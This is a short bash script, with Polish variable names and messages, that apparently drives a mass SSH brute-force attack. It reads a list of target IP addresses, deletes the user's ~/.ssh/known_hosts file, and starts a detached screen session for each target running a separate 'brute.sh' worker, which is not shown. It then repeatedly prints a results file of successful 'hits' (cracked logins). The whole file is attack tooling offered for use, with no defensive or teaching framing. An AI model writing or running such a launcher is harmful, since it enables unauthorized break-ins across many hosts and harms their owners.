#!/bin/bash

data=`date +%d-%m-%y`;
lista_ip=`cat $2`
ilosc=`cat $2 | wc -l`
i=1;

rm ~/.ssh/known_hosts

for x in $lista_ip ; do
        screen -m -d bash brute.sh $1 $x $i $ilosc
        ((++i))
done

while [ true ] ; do
clear
trafienia=`cat efekty/$data:trafienia`
if [ "$trafienia" = " " ] ; then
        echo "Obecnie brak trafien"
else
        echo "$trafienia "
fi
sleep 1s;
done
